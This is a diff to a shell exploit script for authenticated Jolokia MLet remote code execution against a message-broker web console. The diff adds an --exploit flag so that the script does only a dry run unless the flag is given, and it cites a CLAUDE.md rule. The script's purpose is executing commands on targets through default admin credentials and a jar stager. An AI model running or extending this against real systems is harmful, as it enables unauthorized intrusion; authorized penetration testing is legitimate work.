@@ -29,6 +29,7 @@ LOCAL_IP=""
 HTTP_PORT="${HTTP_PORT:-8765}"
 JAR_PATH=""
 KEEP_RUNNING=0
+EXPLOIT=0
 
 while [ $# -gt 0 ]; do
     case "$1" in
@@ -40,12 +41,16 @@ while [ $# -gt 0 ]; do
         --http-port)  HTTP_PORT="$2"; shift 2 ;;
         --jar)        JAR_PATH="$2"; shift 2 ;;
         --keep)       KEEP_RUNNING=1; shift ;;
+        --exploit)    EXPLOIT=1; shift ;;
         -h|--help)
             cat <<EOF
-Usage: $0 --target host:port [--user U] [--pass P] [--cmd 'sh'] [options]
+Usage: $0 --target host:port --exploit [--user U] [--pass P] [--cmd 'sh'] [options]
 
 Required:
   --target HOST:PORT       e.g. 10.0.0.5:8161 (web console)
+  --exploit                REQUIRED to actually fire the chain. Without it the
+                           script prints what it would do and exits 0.
+                           Per CLAUDE.md §9 invariant 1.
 
 Auth:
   --user (default: admin)  --pass (default: admin)
@@ -65,6 +70,18 @@ done
 [ -z "$TARGET" ] && { err "--target required"; exit 1; }
 parse_target "$TARGET"
 [ -z "$PORT" ] && PORT=8161
+
+if [ "$EXPLOIT" != 1 ]; then
+    log "DRY RUN — would fire authenticated Jolokia MLet RCE against $HOST:$PORT"
+    log "  user/pass:  $USER:$PASS"
+    log "  cmd:        $CMD"
+    log "  http-port:  $HTTP_PORT (MLet+jar stager)"
+    log "  jar:        ${JAR_PATH:-(auto-build via javac/jar)}"
+    log ""
+    log "  Re-run with --exploit to load the MBean and execute the command as the broker user."
+    log "  Authorized testing only."
+    exit 0
+fi
 
 # Sanity probe
 if ! jolokia_auth_works; then
